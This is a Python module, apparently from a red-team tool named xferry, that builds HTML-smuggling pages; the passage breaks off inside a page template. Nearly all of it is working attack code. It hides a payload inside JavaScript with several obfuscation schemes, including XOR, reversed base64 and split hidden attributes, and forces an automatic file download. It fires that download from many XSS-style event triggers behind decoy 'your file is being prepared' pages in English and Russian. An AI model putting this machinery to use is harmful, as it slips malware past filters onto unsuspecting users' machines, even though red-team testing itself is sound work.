"""Low-level constructor rendering primitives.

This private module contains only renderer mechanics. Public vocabulary,
defaults, validation, and capabilities live in :mod:`xferry.smuggle.policy`.
"""

import base64
import html.entities
import json
import random
import re
from html import escape

_SPLIT_CHUNK = 1024


def _encode_constructor_payload(raw: bytes, encoding: str) -> tuple[str, str]:
    b64 = base64.b64encode(raw).decode("ascii")
    if encoding == "base64":
        return (
            f"var b=atob('{b64}'),a=new Uint8Array(b.length),i=0;"
            "for(;i<b.length;i++)a[i]=b.charCodeAt(i);",
            "",
        )
    if encoding == "base64url":
        payload = base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
        return (
            f"var s='{payload}',p=s.length%4,b=atob((s+(p?'='.repeat(4-p):''))"
            ".replace(/-/g,'+').replace(/_/g,'/')),a=new Uint8Array(b.length),i=0;"
            "for(;i<b.length;i++)a[i]=b.charCodeAt(i);",
            "",
        )
    if encoding == "base32":
        payload = base64.b32encode(raw).decode("ascii").rstrip("=")
        return (
            f"var s='{payload}',z='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',o=[],v=0,n=0,i=0;"
            "for(;i<s.length;i++){v=(v<<5)|z.indexOf(s[i]);n+=5;"
            "if(n>=8){n-=8;o.push((v>>n)&255);v&=(1<<n)-1}}var a=new Uint8Array(o);",
            "",
        )
    if encoding == "percent":
        payload = "".join(f"%{byte:02X}" for byte in raw)
        return (
            f"var s='{payload}',m=s.match(/%[0-9A-F]{{2}}/g)||[],"
            "a=new Uint8Array(m.length),i=0;"
            "for(;i<m.length;i++)a[i]=parseInt(m[i].slice(1),16);",
            "",
        )
    if encoding == "reverse":
        rev = b64[::-1]
        return (
            f"var b=atob('{rev}'.split('').reverse().join('')),a=new Uint8Array(b.length),i=0;"
            "for(;i<b.length;i++)a[i]=b.charCodeAt(i);",
            "",
        )
    if encoding == "xor":
        key = random.randint(1, 255)
        xb64 = base64.b64encode(bytes(byte ^ key for byte in raw)).decode("ascii")
        return (
            f"var b=atob('{xb64}'),a=new Uint8Array(b.length),i=0,k={key};"
            "for(;i<b.length;i++)a[i]=b.charCodeAt(i)^k;",
            "",
        )
    if encoding == "hex":
        payload_hex = raw.hex()
        return (
            f"var h='{payload_hex}',a=new Uint8Array(h.length/2),i=0;"
            "for(;i<a.length;i++)a[i]=parseInt(h.substr(i*2,2),16);",
            "",
        )
    if encoding == "split":
        chunks = [b64[i : i + _SPLIT_CHUNK] for i in range(0, len(b64), _SPLIT_CHUNK)]
        arr = ",".join(f"'{chunk}'" for chunk in chunks)
        return (
            f"var p=[{arr}],b=atob(p.join('')),a=new Uint8Array(b.length),i=0;"
            "for(;i<b.length;i++)a[i]=b.charCodeAt(i);",
            "",
        )
    if encoding == "attrs":
        chunks = [b64[i : i + _SPLIT_CHUNK] for i in range(0, len(b64), _SPLIT_CHUNK)]
        attrs = " ".join(f'data-{index}="{chunk}"' for index, chunk in enumerate(chunks))
        extra_html = f'<i id="p" {attrs} style="display:none"></i>'
        return (
            "var e=document.getElementById('p')||parent.document.getElementById('p'),d='',n=0;"
            "while(e.dataset[n]!==undefined)d+=e.dataset[n++];"
            "var b=atob(d),a=new Uint8Array(b.length),i=0;"
            "for(;i<b.length;i++)a[i]=b.charCodeAt(i);",
            extra_html,
        )
    if encoding == "charcode":
        nums = ",".join(str(byte) for byte in raw)
        return f"var a=new Uint8Array([{nums}]);", ""
    raise ValueError(f"Unknown SMUGGLE payload encoding: {encoding}")


_CONSTRUCTOR_STATUS_JS = (
    "var _d=document;"
    "try{if(parent&&parent.document!==_d)_d=parent.document}catch(_e){}"
    "var _f=function(){var sl=_d.getElementById('sl'),sd=_d.getElementById('sd');"
    "if(sl)sl.style.display='none';if(sd)sd.style.display='block'};"
    "var _lo=false,_w=window;"
    "try{if(parent&&parent!==window)_w=parent}catch(_e){}"
    "_w.addEventListener('blur',function(){_lo=true});"
    "_w.addEventListener('focus',function(){if(_lo)_f()});"
    "setTimeout(function(){if(!_lo)_f()},1500);"
)


_DOWNLOAD_VARIANT_JS: dict[str, tuple[bool, str]] = {
    "blob-anchor": (
        False,
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=window.URL.createObjectURL(new Blob([a],{type:mt}));"
        "l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);"
        "l.click();l.remove();window.URL.revokeObjectURL(l.href);",
    ),
    "data-uri": (
        False,
        "var r='';for(var i=0;i<a.length;i++)r+=String.fromCharCode(a[i]);"
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href='data:'+mt+';base64,'+btoa(r);l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();",
    ),
    "iframe-blob": (
        False,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "var f=document.createElementNS('http://www.w3.org/1999/xhtml','iframe');"
        "f.style.display='none';(document.body||document.documentElement).appendChild(f);"
        "var fd=f.contentWindow.document,la=fd.createElement('a');"
        "la.href=u;la.download=dn;fd.body.appendChild(la);la.click();"
        "setTimeout(function(){f.remove();window.URL.revokeObjectURL(u)},100);",
    ),
    "filereader": (
        True,
        "var b=new Blob([a],{type:mt});var r=new FileReader();"
        "r.onloadend=function(){var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=r.result;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();__STATUS__};"
        "r.readAsDataURL(b);",
    ),
    "fetch-blob": (
        True,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "fetch(u).then(function(r){return r.blob()}).then(function(bl){"
        "var bu=window.URL.createObjectURL(bl);"
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=bu;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();"
        "window.URL.revokeObjectURL(bu);window.URL.revokeObjectURL(u);__STATUS__});",
    ),
    "window-open": (
        False,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "var c=function(d){var l=d.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;(d.body||d.documentElement).appendChild(l);"
        "l.click();l.remove()};var w=null;try{w=window.open('','_blank')}catch(e){}"
        "if(w&&navigator.userActivation&&navigator.userActivation.isActive){"
        "try{c(w.document);w.close()}catch(e){try{w.close()}catch(_e){}c(document)}}"
        "else{if(w){try{w.close()}catch(_e){}}c(document)}"
        "setTimeout(function(){window.URL.revokeObjectURL(u)},200);",
    ),
    "loc-assign": (
        False,
        "var r='';for(var i=0;i<a.length;i++)r+=String.fromCharCode(a[i]);"
        "window.location.assign('data:'+mt+';base64,'+btoa(r));",
    ),
    "form-post": (
        False,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;l.style.display='none';"
        "(document.body||document.documentElement).appendChild(l);"
        "var e=new MouseEvent('click',{bubbles:true,cancelable:true,view:window});"
        "l.dispatchEvent(e);l.remove();setTimeout(function(){window.URL.revokeObjectURL(u)},200);",
    ),
    "timeout-blob": (
        True,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "setTimeout(function(){var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();"
        "window.URL.revokeObjectURL(u);__STATUS__},0);",
    ),
    "promise-blob": (
        True,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "Promise.resolve(u).then(function(v){var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=v;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();"
        "window.URL.revokeObjectURL(v);__STATUS__});",
    ),
    "raf-blob": (
        True,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "requestAnimationFrame(function(){var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();"
        "window.URL.revokeObjectURL(u);__STATUS__});",
    ),
    "microtask-blob": (
        True,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "queueMicrotask(function(){var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();"
        "window.URL.revokeObjectURL(u);__STATUS__});",
    ),
    "observer-blob": (
        True,
        "var b=new Blob([a],{type:mt});var u=window.URL.createObjectURL(b);"
        "var mn=document.createElement('span');(document.body||document.documentElement).appendChild(mn);"
        "var mo=new MutationObserver(function(ml,obs){obs.disconnect();mn.remove();"
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;"
        "(document.body||document.documentElement).appendChild(l);l.click();l.remove();"
        "window.URL.revokeObjectURL(u);__STATUS__});mo.observe(mn,{childList:true});mn.textContent='x';",
    ),
    "response-blob": (
        True,
        "new Response(a,{headers:{'Content-Type':mt}}).blob().then(function(b){"
        "var u=window.URL.createObjectURL(b),l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;(document.body||document.documentElement).appendChild(l);"
        "l.click();l.remove();window.URL.revokeObjectURL(u);__STATUS__});",
    ),
    "readable-stream": (
        True,
        "var s=new ReadableStream({start:function(c){c.enqueue(a);c.close()}});"
        "new Response(s,{headers:{'Content-Type':mt}}).blob().then(function(b){"
        "var u=window.URL.createObjectURL(b),l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;(document.body||document.documentElement).appendChild(l);"
        "l.click();l.remove();window.URL.revokeObjectURL(u);__STATUS__});",
    ),
    "message-channel-blob": (
        True,
        "var c=new MessageChannel();c.port1.onmessage=function(e){"
        "var b=new Blob([e.data],{type:mt}),u=window.URL.createObjectURL(b);"
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;(document.body||document.documentElement).appendChild(l);"
        "l.click();l.remove();window.URL.revokeObjectURL(u);c.port1.close();__STATUS__};"
        "c.port2.postMessage(a.buffer,[a.buffer]);c.port2.close();",
    ),
    "idle-callback-blob": (
        True,
        "var f=function(){var b=new Blob([a],{type:mt}),u=window.URL.createObjectURL(b);"
        "var l=document.createElementNS('http://www.w3.org/1999/xhtml','a');"
        "l.href=u;l.download=dn;(document.body||document.documentElement).appendChild(l);"
        "l.click();l.remove();window.URL.revokeObjectURL(u);__STATUS__};"
        "if(typeof requestIdleCallback==='function')requestIdleCallback(f);else setTimeout(f,0);",
    ),
}


def _constructor_download_js(variant: str, mime_type: str, download_name: str) -> str:
    async_download, code = _DOWNLOAD_VARIANT_JS[variant]
    if async_download:
        code = code.replace("__STATUS__", _CONSTRUCTOR_STATUS_JS)
    else:
        code += _CONSTRUCTOR_STATUS_JS
    return (
        f"var mt={_safe_inline_javascript_string(mime_type)},"
        f"dn={_safe_inline_javascript_string(download_name)};"
        f"{code}"
    )


_TRIGGER_CONFIGS: dict[str, dict[str, tuple[str, str]]] = {
    "svg": {"onload": ("", '<svg onload="{js}" style="position:absolute;width:0;height:0"></svg>')},
    "body": {"onload": (' onload="{js}"', ""), "onpageshow": (' onpageshow="{js}"', "")},
    "img": {
        "onerror": ("", '<img src=x onerror="{js}" style="display:none">'),
        "onload": (
            "",
            '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" onload="{js}" style="display:none">',
        ),
    },
    "audio": {
        "onerror": ("", '<audio src=x onerror="{js}" style="display:none"></audio>'),
        "onloadstart": ("", '<audio src=x onloadstart="{js}" style="display:none"></audio>'),
    },
    "video": {
        "onerror": ("", '<video src=x onerror="{js}" style="display:none"></video>'),
        "onloadstart": ("", '<video src=x onloadstart="{js}" style="display:none"></video>'),
    },
    "source": {
        "onerror": (
            "",
            '<video style="position:absolute;width:0;height:0"><source src=x onerror="{js}"></video>',
        ),
    },
    "input": {
        "onfocus": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<input aria-label="Download trigger" onfocus="{js}" autofocus style="padding:.55rem .7rem"></label>',
        ),
        "oninput": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<input aria-label="Download trigger" oninput="{js}" style="padding:.55rem .7rem"></label>',
        ),
        "onchange": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<input aria-label="Download trigger" onchange="{js}" style="padding:.55rem .7rem"></label>',
        ),
        "onkeydown": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<input aria-label="Download trigger" onkeydown="{js}" style="padding:.55rem .7rem"></label>',
        ),
    },
    "select": {
        "onfocus": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<select aria-label="Download trigger" autofocus onfocus="{js}" style="padding:.55rem .7rem"><option>Select an action</option><option>Prepare download</option></select></label>',
        ),
        "onchange": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<select aria-label="Download trigger" onchange="{js}" style="padding:.55rem .7rem"><option>Select an action</option><option>Prepare download</option></select></label>',
        ),
    },
    "button": {
        "onfocus": (
            "",
            '<button type="button" autofocus onfocus="{js}" style="margin:1rem;padding:.65rem 1rem;cursor:pointer">Prepare download</button>',
        ),
        "onclick": (
            "",
            '<button type="button" onclick="{js}" style="margin:1rem;padding:.65rem 1rem;cursor:pointer">Prepare download</button>',
        ),
        "onpointerdown": (
            "",
            '<button type="button" onpointerdown="{js}" style="margin:1rem;padding:.65rem 1rem;cursor:pointer">Prepare download</button>',
        ),
        "onkeydown": (
            "",
            '<button type="button" onkeydown="{js}" style="margin:1rem;padding:.65rem 1rem;cursor:pointer">Prepare download</button>',
        ),
    },
    "textarea": {
        "onfocus": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<textarea aria-label="Download trigger" autofocus onfocus="{js}" style="min-width:16rem;min-height:4rem;padding:.55rem .7rem"></textarea></label>',
        ),
        "oninput": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<textarea aria-label="Download trigger" oninput="{js}" style="min-width:16rem;min-height:4rem;padding:.55rem .7rem"></textarea></label>',
        ),
        "onchange": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<textarea aria-label="Download trigger" onchange="{js}" style="min-width:16rem;min-height:4rem;padding:.55rem .7rem"></textarea></label>',
        ),
        "onkeydown": (
            "",
            '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<textarea aria-label="Download trigger" onkeydown="{js}" style="min-width:16rem;min-height:4rem;padding:.55rem .7rem"></textarea></label>',
        ),
    },
    "details": {
        "ontoggle": (
            "",
            '<details open ontoggle="{js}" style="margin:1rem;text-align:left"><summary style="cursor:pointer">Prepare download</summary><p>Toggle this section to start the download.</p></details>',
        ),
        "onclick": (
            "",
            '<details onclick="{js}" style="margin:1rem;text-align:left"><summary style="cursor:pointer">Prepare download</summary><p>Open this section to start the download.</p></details>',
        ),
    },
    "iframe": {
        "srcdoc": (
            "",
            '<iframe srcdoc="<svg onload=&quot;{js}&quot;></svg>" style="display:none"></iframe>',
        ),
        "onload": ("", '<iframe src="about:blank" onload="{js}" style="display:none"></iframe>'),
    },
    "animate": {
        "onbegin": (
            "",
            '<svg style="position:absolute;width:0;height:0"><animate onbegin="{js}" attributeName="x" dur="1s"></animate></svg>',
        ),
        "onend": (
            "",
            '<svg style="position:absolute;width:0;height:0"><animate onend="{js}" attributeName="x" dur="0.01s"></animate></svg>',
        ),
        "onrepeat": (
            "",
            '<svg style="position:absolute;width:0;height:0"><animate onrepeat="{js}" attributeName="x" dur="0.01s" repeatCount="2"></animate></svg>',
        ),
    },
    "animmotion": {
        "onbegin": (
            "",
            '<svg style="position:absolute;width:0;height:0"><animateMotion onbegin="{js}" dur="1s"></animateMotion></svg>',
        ),
        "onend": (
            "",
            '<svg style="position:absolute;width:0;height:0"><animateMotion onend="{js}" dur="0.01s"></animateMotion></svg>',
        ),
        "onrepeat": (
            "",
            '<svg style="position:absolute;width:0;height:0"><animateMotion onrepeat="{js}" dur="0.01s" repeatCount="2"></animateMotion></svg>',
        ),
    },
    "set": {
        "onbegin": (
            "",
            '<svg style="position:absolute;width:0;height:0"><set onbegin="{js}" attributeName="x" to="1" dur="1s"></set></svg>',
        ),
        "onend": (
            "",
            '<svg style="position:absolute;width:0;height:0"><set onend="{js}" attributeName="x" to="1" dur="0.01s"></set></svg>',
        ),
    },
    "cssanim": {
        "onanimationstart": (
            "",
            '<style>@keyframes x{{}}</style><div style="animation-name:x" onanimationstart="{js}"></div>',
        ),
        "onanimationend": (
            "",
            '<style>@keyframes x{{to{{opacity:1}}}}</style><div style="animation:x .001s" onanimationend="{js}"></div>',
        ),
        "onanimationiteration": (
            "",
            '<style>@keyframes x{{to{{opacity:.99}}}}</style><div style="animation:x .01s 2" onanimationiteration="{js}"></div>',
        ),
    },
    "csstransition": {
        "ontransitionrun": (
            "",
            '<div id="smuggleTransition" ontransitionrun="{js}" style="opacity:.99;transition:opacity .01s">Preparing download</div><script>requestAnimationFrame(function(){{document.getElementById("smuggleTransition").style.opacity="1"}})</script>',
        ),
        "ontransitionstart": (
            "",
            '<div id="smuggleTransition" ontransitionstart="{js}" style="opacity:.99;transition:opacity .01s">Preparing download</div><script>requestAnimationFrame(function(){{document.getElementById("smuggleTransition").style.opacity="1"}})</script>',
        ),
        "ontransitionend": (
            "",
            '<div id="smuggleTransition" ontransitionend="{js}" style="opacity:.99;transition:opacity .01s">Preparing download</div><script>requestAnimationFrame(function(){{document.getElementById("smuggleTransition").style.opacity="1"}})</script>',
        ),
    },
    "link": {
        "onerror": ("", '<link rel="stylesheet" href="x" onerror="{js}">'),
        "onload": ("", '<link rel="stylesheet" href="data:text/css," onload="{js}">'),
    },
    "script": {
        "onerror": (
            "",
            '<script src="/__xferry_smuggle_missing__.js" onerror="{js}"></script>',
        ),
    },
    "form": {
        "onsubmit": (
            "",
            '<form onsubmit="event.preventDefault();{js}" style="margin:1rem"><button type="submit" style="padding:.65rem 1rem;cursor:pointer">Prepare download</button></form>',
        ),
    },
    "custom": {
        "onfocus": (
            "",
            '<xss onfocus="{js}" autofocus tabindex="1" style="position:absolute;opacity:0"></xss>',
        ),
    },
    "focusin": {
        "onfocusin": (
            "",
            '<div onfocusin="{js}" autofocus tabindex="1" style="position:absolute;opacity:0;width:0;height:0"></div>',
        ),
    },
    "contentvis": {
        "oncontentvisibilityautostatechange": (
            "",
            '<div oncontentvisibilityautostatechange="{js}" style="content-visibility:auto;position:absolute;width:0;height:0"></div>',
        ),
    },
}
_CONSTRUCTOR_DEFAULT_COPY: dict[str, dict[str, str]] = {
    "ru": {
        "title": "Пожалуйста, подождите...",
        "message": "Ваш файл подготавливается...",
        "notice": "Контролируемый тестовый артефакт.",
    },
    "en": {
        "title": "Please wait...",
        "message": "Your file is being prepared...",
        "notice": "Internal controlled test artifact.",
    },
}

_CONSTRUCTOR_ARCHIVE_COPY: dict[str, dict[str, str]] = {
    "ru": {
        "zip_step_1_prefix": "Проверьте загрузку ZIP-архива",
        "zip_step_1_suffix": ".",
        "zip_step_2": "Перейдите в папку загрузок и распакуйте архив.",
        "zip_fallback": (
            "Если архив не скачался автоматически, обновите страницу или откройте ссылку "
            "в другом браузере."
        ),
    },
    "en": {
        "zip_step_1_prefix": "Check that the ZIP archive downloaded as",
        "zip_step_1_suffix": ".",
        "zip_step_2": "Open the downloads folder and extract the archive.",
        "zip_fallback": (
            "If the archive did not download automatically, refresh the page or open the link "
            "in another browser."
        ),
    },
}


def _constructor_default_copy(locale: str) -> dict[str, str]:
    return _CONSTRUCTOR_DEFAULT_COPY[locale]


def _constructor_archive_copy(locale: str) -> dict[str, str]:
    return _CONSTRUCTOR_ARCHIVE_COPY[locale]


def _constructor_notice_html(locale: str) -> str:
    notice = escape(_constructor_default_copy(locale)["notice"], quote=False)
    return f'<p class="notice">{notice}</p>'


def _resolve_constructor_trigger(
    method: str,
    event: str,
) -> tuple[str, str, bool, str, str]:
    registered = _TRIGGER_CONFIGS[method]
    if event not in registered:
        return method, event, True, "", ""
    body_attrs, trigger = registered[event]
    return method, event, False, body_attrs, trigger


_CUSTOM_TRIGGER_TARGETS: dict[str, tuple[str, str, str]] = {
    "svg": (
        '<svg id="smuggleCustomTrigger" role="button" tabindex="0" aria-label="Prepare download" width="180" height="44"><rect width="180" height="44" rx="8" fill="#1a73e8"></rect><text x="90" y="27" text-anchor="middle" fill="white">Prepare download</text></svg>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "body": ("", "document.body", ""),
    "img": (
        '<img id="smuggleCustomTrigger" alt="Prepare download" style="display:block;min-width:12rem;min-height:3rem;margin:1rem">',
        'document.getElementById("smuggleCustomTrigger")',
        't.src="/__xferry_smuggle_missing_image__";',
    ),
    "audio": (
        '<audio id="smuggleCustomTrigger" controls aria-label="Prepare download" style="display:block;margin:1rem"></audio>',
        'document.getElementById("smuggleCustomTrigger")',
        't.src="/__xferry_smuggle_missing_audio__";t.load();',
    ),
    "video": (
        '<video id="smuggleCustomTrigger" controls aria-label="Prepare download" style="display:block;width:18rem;margin:1rem"></video>',
        'document.getElementById("smuggleCustomTrigger")',
        't.src="/__xferry_smuggle_missing_video__";t.load();',
    ),
    "source": (
        '<video controls aria-label="Prepare download" style="display:block;width:18rem;margin:1rem"><source id="smuggleCustomTrigger"></video>',
        'document.getElementById("smuggleCustomTrigger")',
        't.src="/__xferry_smuggle_missing_source__";t.parentElement.load();',
    ),
    "input": (
        '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<input id="smuggleCustomTrigger" aria-label="Download trigger" style="padding:.55rem .7rem"></label>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "select": (
        '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<select id="smuggleCustomTrigger" aria-label="Download trigger" style="padding:.55rem .7rem"><option>Select an action</option><option>Prepare download</option></select></label>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "button": (
        '<button id="smuggleCustomTrigger" type="button" style="margin:1rem;padding:.65rem 1rem;cursor:pointer">Prepare download</button>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "textarea": (
        '<label style="display:inline-grid;gap:.35rem;margin:1rem">Download trigger<textarea id="smuggleCustomTrigger" aria-label="Download trigger" style="min-width:16rem;min-height:4rem;padding:.55rem .7rem"></textarea></label>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "details": (
        '<details id="smuggleCustomTrigger" style="margin:1rem;text-align:left"><summary style="cursor:pointer">Prepare download</summary><p>Interact with this section to start the download.</p></details>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "iframe": (
        '<iframe id="smuggleCustomTrigger" title="Prepare download" style="display:block;width:18rem;height:4rem;margin:1rem"></iframe>',
        'document.getElementById("smuggleCustomTrigger")',
        't.src="about:blank#smuggle-trigger";',
    ),
    "animate": (
        '<svg role="button" tabindex="0" aria-label="Prepare download" width="180" height="44"><rect width="180" height="44" rx="8" fill="#1a73e8"><animate id="smuggleCustomTrigger" attributeName="opacity" from=".99" to="1" dur=".01s"></animate></rect><text x="90" y="27" text-anchor="middle" fill="white">Prepare download</text></svg>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "animmotion": (
        '<svg role="button" tabindex="0" aria-label="Prepare download" width="180" height="44"><circle cx="20" cy="22" r="8" fill="#1a73e8"><animateMotion id="smuggleCustomTrigger" path="M0,0 L140,0" dur=".1s"></animateMotion></circle></svg>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "set": (
        '<svg role="button" tabindex="0" aria-label="Prepare download" width="180" height="44"><rect width="180" height="44" rx="8" fill="#1a73e8"><set id="smuggleCustomTrigger" attributeName="opacity" to="1" begin="0s"></set></rect></svg>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "cssanim": (
        '<div id="smuggleCustomTrigger" role="button" tabindex="0" aria-label="Prepare download" style="display:inline-block;margin:1rem;padding:.65rem 1rem;animation:smugglePulse .2s 2">Prepare download</div><style>@keyframes smugglePulse{to{opacity:.99}}</style>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "csstransition": (
        '<div id="smuggleCustomTrigger" role="button" tabindex="0" aria-label="Prepare download" style="display:inline-block;margin:1rem;padding:.65rem 1rem;opacity:.99;transition:opacity .01s">Prepare download</div>',
        'document.getElementById("smuggleCustomTrigger")',
        'requestAnimationFrame(function(){t.style.opacity="1"});',
    ),
    "link": (
        '<link id="smuggleCustomTrigger" rel="stylesheet">',
        'document.getElementById("smuggleCustomTrigger")',
        't.href="/__xferry_smuggle_missing_stylesheet__";',
    ),
    "script": (
        '<script id="smuggleCustomTrigger"></script>',
        'document.getElementById("smuggleCustomTrigger")',
        't.src="/__xferry_smuggle_missing_script__";',
    ),
    "form": (
        '<form id="smuggleCustomTrigger" style="margin:1rem"><button type="submit" style="padding:.65rem 1rem;cursor:pointer">Prepare download</button></form>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "custom": (
        '<xss id="smuggleCustomTrigger" role="button" tabindex="0" style="display:inline-block;margin:1rem;padding:.65rem 1rem">Prepare download</xss>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "focusin": (
        '<div id="smuggleCustomTrigger" tabindex="0" role="button" style="display:inline-block;margin:1rem;padding:.65rem 1rem">Prepare download</div>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
    "contentvis": (
        '<div id="smuggleCustomTrigger" tabindex="0" role="button" style="content-visibility:auto;display:inline-block;margin:1rem;padding:.65rem 1rem">Prepare download</div>',
        'document.getElementById("smuggleCustomTrigger")',
        "",
    ),
}


def _render_custom_constructor_trigger(method: str, event: str, js: str) -> str:
    """Render a fixed method target plus a safe custom event listener."""
    markup, target_expression, activation_js = _CUSTOM_TRIGGER_TARGETS[method]
    listener_name = event.removeprefix("on")
    prevent_default = "if(e&&e.type==='submit')e.preventDefault();" if method == "form" else ""
    return (
        f"{markup}<script>(function(){{var t={target_expression};if(!t)return;"
        f"t.addEventListener({_safe_script_json(listener_name)},function(e){{"
        f"{prevent_default}{js}}},{{once:true}});{activation_js}}})();</script>"
    )


_CONSTRUCTOR_TEMPLATES: dict[str, str] = {
    "default": """<!DOCTYPE html>
<html lang="{locale}">
<head><meta charset="UTF-8"><title>{title}</title><style>
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;color:#333}}
.container{{text-align:center;padding:2rem;background:white;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}}
.spinner{{border:4px solid #e0e0e0;border-top:4px solid #1a73e8;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:1rem auto}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}.done{{width:40px;height:40px;margin:1rem auto}}#sd{{display:none}}#sd p{{color:#34a853;font-weight:500}}.notice{{margin:0 0 1rem;padding:.75rem 1rem;border-radius:8px;background:#e8f0fe;color:#174ea6}}
</style></head><body{body_attrs}><div class="container">{notice}<div id="sl"><div class="spinner"></div><h1>{title}</h1><p>{message}</p></div><div id="sd"><svg class="done" viewBox="0 0 24 24" fill="none" stroke="#34a853" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg><h1>{title}</h1><p>{message}</p></div></div>{extra_html}{trigger_element}</body></html>""",
    "minimal": """<!DOCTYPE html>
<html lang="{locale}"><head><meta charset="UTF-8"><title>{title}</title></head>
<body{body_attrs}>{notice}<main><h1>{title}</h1><p>{message}</p></main>{extra_html}{trigger_element}</body></html>""",
    "corporate": """<!DOCTYPE html>
<html lang="{locale}">
<head><meta charset="UTF-8"><title>{title}</title><style>
*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#1a1a2e;color:#e0e0e0;min-height:100vh;display:flex;flex-direction:column}}
.header{{background:#16213e;padding:1rem 2rem;display:flex;align-items:center;gap:1rem;border-bottom:2px solid #0f3460}}.header h1{{font-size:1.1rem;font-weight:500;color:#4e9af1}}
.main{{flex:1;display:flex;justify-content:center;align-items:center}}.card{{background:#16213e;border-radius:12px;padding:3rem;text-align:center;max-width:440px;box-shadow:0 4px 24px rgba(0,0,0,.3)}}
.icon{{width:64px;height:64px;margin:0 auto 1.5rem;background:#0f3460;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#4e9af1;font-size:2rem}}
.card h2{{font-size:1.2rem;margin-bottom:.5rem;color:#fff}}.card p{{color:#8a8a9a;font-size:.9rem;margin-bottom:1.5rem}}.progress{{height:4px;background:#0f3460;border-radius:2px;overflow:hidden}}
.progress-bar{{height:100%;width:30%;background:#4e9af1;border-radius:2px;animation:loading 2s ease-in-out infinite}}@keyframes loading{{0%{{width:10%}}50%{{width:80%}}100%{{width:10%}}}}
.footer{{text-align:center;padding:1rem;color:#555;font-size:.75rem}}#sd{{display:none}}#sd p{{color:#34a853}}.notice{{margin:0 0 1rem;padding:.75rem 1rem;border-radius:8px;background:#0f3460;color:#bfdbfe}}
